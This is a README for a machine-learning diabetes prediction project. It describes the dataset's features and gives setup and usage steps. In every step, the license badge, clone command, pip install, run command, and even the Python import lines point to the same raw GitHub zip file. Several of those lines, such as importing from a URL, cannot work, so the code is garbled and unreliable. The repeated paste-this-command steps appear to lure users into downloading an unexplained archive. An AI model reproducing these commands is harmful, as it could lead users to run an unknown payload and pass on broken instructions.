# Diabetes Prediction System

[![License](https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip)](LICENSE)

## Overview

The Diabetes Prediction System is a machine learning project designed to predict the likelihood of a person having diabetes based on health-related features. This README provides information about the dataset and how to use the provided code for prediction.

## Dataset

The dataset contains the following features:

1. **Pregnancies:** Number of times pregnant
2. **Glucose:** Plasma glucose concentration a 2 hours in an oral glucose tolerance test
3. **BloodPressure:** Diastolic blood pressure (mm Hg)
4. **SkinThickness:** Triceps skin fold thickness (mm)
5. **Insulin:** 2-Hour serum insulin (mu U/ml)
6. **BMI:** Body mass index (weight in kg/(height in m)^2)
7. **DiabetesPedigreeFunction:** Diabetes pedigree function
8. **Age:** Age in years
9. **Outcome:** Binary variable indicating whether the person has diabetes (1) or not (0)

## Prerequisites

Before running the Diabetes Prediction System, ensure you have the following prerequisites installed:

- Python 3.x
- Pip (Python package installer)

```bash
pip install -r https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
```

Additionally, make sure to have the following Python libraries installed:

```bash
pip install numpy pandas scikit-learn
```

These libraries are used for data manipulation (`numpy` and `pandas`), data preprocessing (`StandardScaler` from `scikit-learn`), machine learning model (`svm` for Support Vector Machine), and model evaluation (`accuracy_score` from `scikit-learn`).

```python
import numpy as np
import pandas as pd
from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import StandardScaler
from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import train_test_split
from sklearn import svm
from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import accuracy_score
```

Include these lines in your Python script for the Diabetes Prediction System to ensure that the necessary libraries are imported and available for use.

### Usage

To use the Diabetes Prediction System, follow these steps:

1. Clone the repository:

   ```bash
   git clone https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
   cd diabetes prediction
   ```

2. Install the required dependencies:

   ```bash
   pip install -r https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
   ```

3. Run the prediction script:

   ```bash
   python https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
   ```

   This will prompt you to input health-related features for prediction.
   
## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
oject.

